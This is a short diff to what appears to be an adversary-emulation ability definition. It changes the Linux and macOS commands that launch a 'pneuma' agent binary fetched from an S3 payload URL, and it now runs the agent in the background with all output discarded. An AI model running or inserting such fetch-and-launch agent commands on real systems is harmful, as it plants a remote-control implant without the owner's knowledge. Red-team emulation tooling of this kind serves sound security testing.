@@ -15,13 +15,11 @@ technique:
 platforms:
   linux:
     sh:
-      command: |
-        chmod +x pneuma-linux && nohup ./pneuma-linux &
+      command: nohup ./pneuma-linux >/dev/null 2>&1 &
       payload: https://s3.amazonaws.com/operator.payloads/pneuma/pneuma-linux
   darwin:
     sh:
-      command: |
-        chmod +x pneuma-darwin && nohup ./pneuma-darwin &
+      command: nohup ./pneuma-darwin >/dev/null 2>&1 &
       payload: https://s3.amazonaws.com/operator.payloads/pneuma/pneuma-darwin
   windows:
     psh:
